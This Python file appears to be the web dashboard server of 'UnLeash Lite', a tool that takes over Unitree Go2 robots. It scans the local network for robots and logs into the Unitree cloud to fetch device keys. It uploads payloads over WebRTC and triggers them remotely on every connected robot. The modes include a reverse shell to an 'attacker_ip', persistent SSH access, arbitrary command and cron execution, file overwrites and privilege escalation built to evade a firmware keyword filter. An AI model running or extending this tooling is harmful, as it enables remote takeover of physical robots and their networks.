"""Web dashboard server for UnLeash Lite.

Serves the dashboard UI and exposes the jailbreak functionality via
REST API + Server-Sent Events for live feed updates.

Usage:
    python -m unleash_lite serve [--host 0.0.0.0] [--port 8443] [--password SECRET]
"""

import asyncio
import hashlib
import json
import logging
import secrets
import socket
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path

from aiohttp import web

from .webrtc import Go2DataChannel
from .webrtc_payloads import (
    PAYLOAD_REGISTRY, validate_bypass_payload,
    payload_ssh, payload_reverse_shell, payload_custom,
    payload_ssh_persist, payload_bypass_ssh,
    payload_bypass_hosts, payload_bypass_file,
    payload_bypass_cron, payload_bypass_escalate,
)

logger = logging.getLogger("unleash_lite.server")

DASHBOARD_HTML = Path(__file__).parent / "dashboard.html"


def _get_local_ip():
    for target in ("192.168.123.161", "8.8.8.8"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target, 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            continue
    return None


@dataclass
class HostInfo:
    ip: str
    port: int = 9991
    status: str = "discovered"
    firmware: str = ""
    hostname: str = ""
    last_seen: str = ""
    aes_key: str = ""


class UnleashServer:

    def __init__(self, host="0.0.0.0", port=8443, password=None):
        self.host = host
        self.port = port
        self.password = password
        self.token = secrets.token_hex(16) if password else None
        self.hosts: dict[str, HostInfo] = {}
        self.connections: dict[str, Go2DataChannel] = {}
        self.sse_queues: list[asyncio.Queue] = []
        self.staged = 0
        self.completed = 0

    def _check_auth(self, request):
        if not self.password:
            return True
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer ") and auth[7:] == self.token:
            return True
        return False

    def _require_auth(self, request):
        if not self._check_auth(request):
            raise web.HTTPUnauthorized()

    def _broadcast(self, event):
        data = json.dumps(event)
        dead = []
        for q in self.sse_queues:
            try:
                q.put_nowait(data)
            except asyncio.QueueFull:
                dead.append(q)
        for q in dead:
            self.sse_queues.remove(q)

    def _feed(self, badge, label, message, detail=None):
        evt = {"type": "feed", "badge": badge, "label": label,
               "message": message}
        if detail:
            evt["detail"] = detail
        self._broadcast(evt)

    def _host_update(self, h: HostInfo):
        self._broadcast({"type": "host_update", "host": asdict(h)})

    def _stats_update(self):
        self._broadcast({
            "type": "stats",
            "found": len(self.hosts),
            "connected": len(self.connections),
            "staged": self.staged,
            "completed": self.completed,
        })

    # ── Routes ──

    async def handle_index(self, request):
        return web.FileResponse(DASHBOARD_HTML)

    async def handle_login(self, request):
        data = await request.json()
        pw = data.get("password", "")
        if self.password and pw != self.password:
            raise web.HTTPUnauthorized()
        return web.json_response({"ok": True, "token": self.token or "open"})

    async def handle_events(self, request):
        t = request.query.get("token", "")
        if self.password and t != self.token:
            raise web.HTTPUnauthorized()

        resp = web.StreamResponse()
        resp.headers["Content-Type"] = "text/event-stream"
        resp.headers["Cache-Control"] = "no-cache"
        resp.headers["X-Accel-Buffering"] = "no"
        await resp.prepare(request)

        q = asyncio.Queue(maxsize=256)
        self.sse_queues.append(q)
        try:
            while True:
                data = await q.get()
                await resp.write(f"data: {data}\n\n".encode())
        except (asyncio.CancelledError, ConnectionResetError):
            pass
        finally:
            if q in self.sse_queues:
                self.sse_queues.remove(q)
        return resp

    async def handle_status(self, request):
        self._require_auth(request)
        hosts_dict = {ip: asdict(h) for ip, h in self.hosts.items()}
        return web.json_response({
            "found": len(self.hosts),
            "connected": len(self.connections),
            "staged": self.staged,
            "completed": self.completed,
            "firmware": "--",
            "hosts": hosts_dict,
        })

    async def handle_scan(self, request):
        self._require_auth(request)
        self._feed("task", "SCAN", "Scanning LAN for Unitree robots...")
        found = []

        scan_ips = ["192.168.123.161", "192.168.123.162"]
        local_ip = _get_local_ip()
        if local_ip and local_ip.startswith("192.168.123."):
            base = ".".join(local_ip.split(".")[:3])
            for i in range(1, 255):
                ip = f"{base}.{i}"
                if ip not in scan_ips and ip != local_ip:
                    scan_ips.append(ip)

        async def probe_ip(ip, port=9991):
            try:
                _, w = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=1.0)
                w.close()
                await w.wait_closed()
                return ip
            except Exception:
                return None

        tasks = [probe_ip(ip) for ip in scan_ips]
        results = await asyncio.gather(*tasks)
        for ip in results:
            if ip:
                found.append(ip)
                if ip not in self.hosts:
                    h = HostInfo(ip=ip, status="discovered",
                                last_seen=time.strftime("%Y-%m-%dT%H:%M:%SZ"))
                    self.hosts[ip] = h
                    self._host_update(h)

        if found:
            self._feed("success", "SCAN",
                       f"Found {len(found)} robot(s): {', '.join(found)}")
        else:
            self._feed("warning", "SCAN", "No robots found on LAN")
        self._stats_update()
        return web.json_response({"ok": True, "found": found})

    async def handle_connect(self, request):
        self._require_auth(request)
        data = await request.json()
        ip = data.get("robot_ip", "192.168.123.161")
        port = data.get("port", 9991)
        aes_key = data.get("aes_key")

        if ip in self.connections:
            return web.json_response({"ok": True, "message": "Already connected"})

        h = self.hosts.get(ip) or HostInfo(ip=ip, port=port)
        h.status = "connecting"
        h.port = port
        if aes_key:
            h.aes_key = aes_key
        h.last_seen = time.strftime("%Y-%m-%dT%H:%M:%SZ")
        self.hosts[ip] = h
        self._host_update(h)
        self._feed("stage", "CONNECT", f"Connecting to {ip}:{port}...")

        dc = Go2DataChannel(ip, port, aes_128_key=aes_key)
        try:
            await dc.connect()
            self.connections[ip] = dc
            h.status = "connected"
            self._host_update(h)
            self._feed("success", "CONNECTED",
                       f"WebRTC data channel open to {ip}")
            self._stats_update()
            return web.json_response({"ok": True})
        except Exception as e:
            h.status = "error"
            self._host_update(h)
            self._feed("error", "FAILED", f"Connection to {ip} failed: {e}")
            self._stats_update()
            return web.json_response({"ok": False, "error": str(e)})

    async def handle_disconnect(self, request):
        self._require_auth(request)
        data = await request.json()
        ip = data.get("robot_ip")
        if ip in self.connections:
            try:
                await self.connections[ip].close()
            except Exception:
                pass
            del self.connections[ip]
        if ip in self.hosts:
            self.hosts[ip].status = "disconnected"
            self._host_update(self.hosts[ip])
            del self.hosts[ip]
        self._stats_update()
        return web.json_response({"ok": True})

    async def handle_reset(self, request):
        self._require_auth(request)
        for ip, dc in list(self.connections.items()):
            try:
                await dc.close()
            except Exception:
                pass
        self.connections.clear()
        self.hosts.clear()
        self.staged = 0
        self.completed = 0
        self._stats_update()
        self._feed("warning", "RESET", "All connections reset")
        return web.json_response({"ok": True})

    async def handle_jailbreak(self, request):
        self._require_auth(request)
        data = await request.json()
        mode = data.get("mode")
        target = data.get("target", "*")
        hotkey = data.get("hotkey", "L1+Y")

        targets = (list(self.connections.keys())
                   if target == "*" else [target])

        if not targets:
            return web.json_response({
                "ok": False,
                "error": "No connected hosts. Connect to a robot first."
            })

        payload = self._build_payload(mode, data, hotkey)
        if isinstance(payload, str):
            return web.json_response({"ok": False, "error": payload})

        ok, kw = validate_bypass_payload(payload.python_code)
        if not ok and not mode.startswith("bypass-"):
            self._feed("warning", "WARNING",
                       f"Payload contains blocked keyword {kw!r} "
                       f"(will fail on fw >= 1.1.14)")

        results = []
        for ip in targets:
            dc = self.connections.get(ip)
            if not dc:
                # Auto-connect if not yet connected
                h = self.hosts.get(ip) or HostInfo(ip=ip)
                aes_key = h.aes_key or data.get("aes_key")
                port = h.port or 9991
                dc = Go2DataChannel(ip, port, aes_128_key=aes_key or None)
                try:
                    self._feed("stage", "CONNECT",
                               f"Auto-connecting to {ip}...")
                    await dc.connect()
                    self.connections[ip] = dc
                    h.status = "connected"
                    h.last_seen = time.strftime("%Y-%m-%dT%H:%M:%SZ")
                    self.hosts[ip] = h
                    self._host_update(h)
                except Exception as e:
                    self._feed("error", "FAILED",
                               f"Auto-connect to {ip} failed: {e}")
                    results.append({"ip": ip, "ok": False, "error": str(e)})
                    continue

            self._feed("upload", "UPLOAD",
                       f"Uploading {mode} payload to {ip} "
                       f"({len(payload.python_code)} bytes)...")

            try:
                status, resp = await dc.upload_program(
                    payload.python_code, payload.program_uuid, hotkey)
                if status == 0:
                    self.staged += 1
                    self._feed("success", "STAGED",
                               f"Payload staged on {ip} — "
                               f"press {hotkey} on controller")
                    self._stats_update()

                    programs, _ = await dc.list_programs()
                    registered = any(
                        p.get("program_uuid") == payload.program_uuid
                        for p in programs)
                    if registered:
                        self._feed("success", "VERIFIED",
                                   f"Registered on {hotkey} (uuid={payload.program_uuid})")
                    else:
                        self._feed("warning", "WARNING",
                                   "Not found in hotkey list (may still work)")

                    self._feed("stage", "TRIGGER",
                               f"Triggering {hotkey} via bridge on {ip}...")
                    try:
                        await dc.trigger_hotkey(hotkey)
                        self.completed += 1
                        self._feed("success", "TRIGGERED",
                                   f"Payload delivered + triggered on {ip} "
                                   f"(no controller needed)")
                    except Exception as te:
                        self._feed("warning", "WARNING",
                                   f"Bridge trigger failed ({te}) — "
                                   f"press {hotkey} on controller manually")

                    results.append({"ip": ip, "ok": True})
                else:
                    self._feed("error", "REJECTED",
                               f"Upload rejected by {ip} (status {status})",
                               json.dumps(resp, indent=2) if resp else None)
                    results.append({"ip": ip, "ok": False,
                                    "error": f"status {status}"})
            except Exception as e:
                self._feed("error", "ERROR",
                           f"Upload to {ip} failed: {e}")
                results.append({"ip": ip, "ok": False, "error": str(e)})

        ok_count = sum(1 for r in results if r.get("ok"))
        if ok_count > 0:
            if mode == "bypass-ssh":
                self._feed("stage", "INFO",
                           "Cron job written. Wait up to 60s for crond "
                           "to execute, then SSH to the robot.")
            self._stats_update()
            return web.json_response({
                "ok": True,
                "message": f"Payload delivered + triggered on "
                           f"{ok_count}/{len(targets)} host(s).",
                "results": results,
            })
        else:
            return web.json_response({
                "ok": False,
                "error": "All uploads failed",
                "results": results,
            })

    def _build_payload(self, mode, data, hotkey):
        pw = data.get("password", "unleash")
        local_ip = _get_local_ip()
        attacker_ip = data.get("attacker_ip") or local_ip

        try:
            if mode == "ssh":
                return payload_ssh(password=pw, hotkey=hotkey)
            elif mode == "reverse-shell":
                if not attacker_ip:
                    return "--attacker-ip required"
                return payload_reverse_shell(
                    attacker_ip=attacker_ip, hotkey=hotkey)
            elif mode == "custom":
                cmd = data.get("cmd")
                if not cmd:
                    return "--cmd required"
                return payload_custom(command=cmd, hotkey=hotkey)
            elif mode == "ssh-persist":
                return payload_ssh_persist(password=pw, hotkey=hotkey)
            elif mode == "bypass-ssh":
                return payload_bypass_ssh(password=pw, hotkey=hotkey)
            elif mode == "bypass-hosts":
                if not attacker_ip:
                    return "--attacker-ip required"
                return payload_bypass_hosts(
                    attacker_ip=attacker_ip, hotkey=hotkey)
            elif mode == "bypass-file":
                fp = data.get("file_path")
                content = data.get("content")
                if not fp or not content:
                    return "--file-path and --content required"
                return payload_bypass_file(
                    file_path=fp, content=content, hotkey=hotkey)
            elif mode == "bypass-cron":
                cmd = data.get("cmd")
                if not cmd:
                    return "--cmd required"
                return payload_bypass_cron(command=cmd, hotkey=hotkey)
            elif mode == "bypass-escalate":
                code = data.get("code")
                if not code:
                    return "--code required"
                return payload_bypass_escalate(
                    unfiltered_code=code, hotkey=hotkey)
            else:
                return f"Unknown mode: {mode}"
        except Exception as e:
            return str(e)

    async def handle_probe(self, request):
        self._require_auth(request)
        data = await request.json()
        ip = data.get("robot_ip", "192.168.123.161")
        aes_key = data.get("aes_key")

        h = self.hosts.get(ip)
        if h and h.aes_key:
            aes_key = aes_key or h.aes_key

        self._feed("task", "PROBE", f"Probing {ip}...")

        dc = Go2DataChannel(ip, 9991, aes_128_key=aes_key)
        all_msgs = []
        dc.on_message(lambda m: all_msgs.append(m))

        try:
            await dc.connect()
            self._feed("success", "PROBE", f"Connected to {ip}")

            programs, list_resp = await dc.list_programs()
            self._feed("task", "PROBE",
                       f"Found {len(programs)} program(s) on hotkey list")

            import time as _time
            probe_uuid = str(int(_time.time()))
            status, upload_resp = await dc.upload_program(
                "pass", probe_uuid, "L1+Y")
            self._feed("task", "PROBE",
                       f"No-op upload status: {status}")

            programs_after, _ = await dc.list_programs()
            found = any(p.get("program_uuid") == probe_uuid
                        for p in programs_after)

            detail_lines = [
                f"Programs before: {len(programs)}",
                f"Upload status: {status}",
                f"Programs after: {len(programs_after)}",
                f"UUID round-trip: {'OK' if found else 'FAILED'}",
                f"Total DC messages: {len(all_msgs)}",
            ]
            if list_resp:
                detail_lines.append(
                    f"Raw list: {json.dumps(list_resp, indent=2)}")
            detail = "\n".join(detail_lines)

            await dc.close()
            self._feed("success", "PROBE", f"Probe of {ip} complete",
                       detail)
            return web.json_response({"ok": True, "detail": detail})

        except Exception as e:
            try:
                await dc.close()
            except Exception:
                pass
            self._feed("error", "PROBE", f"Probe failed: {e}")
            return web.json_response({"ok": False, "error": str(e)})

    async def handle_trigger(self, request):
        self._require_auth(request)
        data = await request.json()
        target = data.get("target", "*")
        hotkey = data.get("hotkey", "L1+Y")

        targets = (list(self.connections.keys())
                   if target == "*" else [target])

        if not targets:
            return web.json_response({
                "ok": False,
                "error": "No connected hosts."
            })

        results = []
        for ip in targets:
            dc = self.connections.get(ip)
            if not dc:
                self._feed("error", "ERROR",
                           f"Not connected to {ip}")
                results.append({"ip": ip, "ok": False})
                continue
            try:
                self._feed("stage", "TRIGGER",
                           f"Sending {hotkey} to {ip} via bridge...")
                await dc.trigger_hotkey(hotkey)
                self._feed("success", "TRIGGERED",
                           f"{hotkey} triggered on {ip}")
                results.append({"ip": ip, "ok": True})
            except Exception as e:
                self._feed("error", "ERROR",
                           f"Trigger failed on {ip}: {e}")
                results.append({"ip": ip, "ok": False, "error": str(e)})

        ok_count = sum(1 for r in results if r.get("ok"))
        return web.json_response({
            "ok": ok_count > 0,
            "message": f"Triggered {hotkey} on {ok_count}/{len(targets)} host(s).",
        })

    async def handle_cloud_devices(self, request):
        self._require_auth(request)
        data = await request.json()
        email = data.get("email")
        password = data.get("password")
        region = data.get("region", "global")
        device_type = data.get("device_type", "Go2")

        try:
            from .unitree_cloud import UnitreeCloud, UnitreeCloudError
        except ImportError:
            return web.json_response({
                "ok": False,
                "error": "curl_cffi is required. Install: pip install curl_cffi"
            })

        try:
            cloud = UnitreeCloud(region=region, device_type=device_type)
            cloud.login(email, password)
            devices = cloud.list_devices()
            result = []
            for d in devices:
                result.append({
                    "sn": d.get("sn", "?"),
                    "alias": d.get("alias", "") or "-",
                    "key": d.get("key", "") or d.get("gcm_key", ""),
                })
            return web.json_response({"ok": True, "devices": result})
        except Exception as e:
            return web.json_response({"ok": False, "error": str(e)})

    def create_app(self):
        app = web.Application()
        app.router.add_get("/", self.handle_index)
        app.router.add_post("/api/login", self.handle_login)
        app.router.add_get("/api/events", self.handle_events)
        app.router.add_get("/api/status", self.handle_status)
        app.router.add_post("/api/scan", self.handle_scan)
        app.router.add_post("/api/connect", self.handle_connect)
        app.router.add_post("/api/disconnect", self.handle_disconnect)
        app.router.add_post("/api/reset", self.handle_reset)
        app.router.add_post("/api/jailbreak", self.handle_jailbreak)
        app.router.add_post("/api/probe", self.handle_probe)
        app.router.add_post("/api/trigger", self.handle_trigger)
        app.router.add_post("/api/cloud/devices", self.handle_cloud_devices)
        return app

    def run(self):
        app = self.create_app()
        print()
        print(f"  \033[1;36m{'=' * 54}\033[0m")
        print(f"  \033[1;36m\033[1m  UnLeash Lite — Dashboard\033[0m")
        print(f"  \033[1;36m  http://{self.host}:{self.port}\033[0m")
        if self.password:
            print(f"  \033[1;36m  Password: {'*' * len(self.password)}\033[0m")
        else:
            print(f"  \033[1;33m  No password set (open access)\033[0m")
        print(f"  \033[1;36m{'=' * 54}\033[0m")
        print()
        web.run_app(app, host=self.host, port=self.port,
                    print=lambda _: None)
